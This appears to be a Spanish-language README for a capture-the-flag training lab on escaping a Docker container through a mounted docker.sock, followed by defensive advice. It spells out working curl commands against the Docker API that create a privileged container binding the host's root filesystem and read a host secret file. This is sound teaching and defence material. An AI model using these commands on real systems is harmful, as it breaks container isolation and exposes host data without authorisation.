# Lab container-escape-lab

Room: **containers-y-cloud** (task adicional, Tier 3). Escapar vía docker.sock.

## Uso
```bash
cp flags.env.example flags.env
docker compose --env-file flags.env up -d
docker exec -it lab-container-escape-shell-1 sh
```

## La técnica (dentro del contenedor)

```sh
# 1. Recon: ¿hay socket? ¿habla con el daemon del HOST?
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version   # FLAG_1

# 2. ¿Qué corre en el host?
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# 3. Escape: crear un contenedor privileged montando / del host
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/flag/host-secret.txt"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
# FLAG_2 en las Warnings. Luego: POST /containers/<id>/start  → 204

# 4. Leer logs del host: GET /containers/<id>/logs → FLAG_3
```

## Qué aprende cada flag
1. Reconocer el socket y confirmar que controla el daemon host
2. Construir el escape completo (privileged + bind /)
3. Leer un archivo del host desde el contenedor escapado

## Defensa real
- Nunca montes docker.sock (usa socket-proxy read-only o Docker API segmentada)
- readOnly root filesystem + no-new-privileges + cap_drop ALL
- runtime sandbox (gVisor/Kata) para cargas no confiables
